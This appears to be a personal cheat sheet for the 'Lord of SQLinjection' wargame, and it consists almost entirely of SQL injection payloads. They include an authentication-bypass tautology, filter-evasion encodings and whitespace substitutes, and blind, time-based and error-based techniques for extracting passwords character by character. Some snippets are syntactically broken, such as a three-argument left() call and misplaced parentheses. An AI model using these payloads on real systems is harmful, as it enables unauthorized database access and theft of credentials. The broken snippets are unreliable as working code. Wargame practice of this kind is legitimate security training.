# Lord-of-SQLinjection
#web_hacking #SQLinjection

?pw=' or 1=1 --%20  
?pw like "a%"  
?pw like "a_b_c"  
?id in ("admin")  
or -> ||  
and -> %26%26  
admin -> 0x61646d696e  
0x -> 0b  

<h4>bypass ' '</h4>
<ul>%09 (\t)</ul>
<ul>%0a (\n)</ul>
<ul>%0d (\r)</ul>
<ul>%0b</ul>
<ul>%0c</ul>

<h4>Blind SQL injection</h4>
<ul>length(pw)<10</ul>
<ul>ord(substr(pw,2,1)) > 5</ul>
<ul>substr(pw,2,1) > char(5)</ul>
<ul>substring(pw,2,1) > char(5)</ul>
<ul>substr(pw from 2 for 1) > char(5)</ul> 
<ul>ord(right(left(pw,2,1)))>5</ul>

<h4>Time-based SQL injection</h4>
<ul>if((ord(substr(pw,2,1)>5), (sleep(2)), 1)</ul>
<ul>id='admin' and length(pw)=10 and sleep(2)</ul>
<ul>pw=(sleep(3*(length(flag)=10)))</ul>

<h4>Error-based SQL injection</h4>
<ul>if(ord(substr(pw,2,1)>5, (select 1 union select 2), 1)</ul>
<ul>order by (select 1 union select length(pw)<10)</ul>

<li>limit 0,1</li>
<li>and>or</li>
<li>if there is # -> use Line Feed!</li>
<li>if you want to make the query error, pw=1=(select 1 union select 2)</li>
<li>ereg -> %00, case sensitive</li>
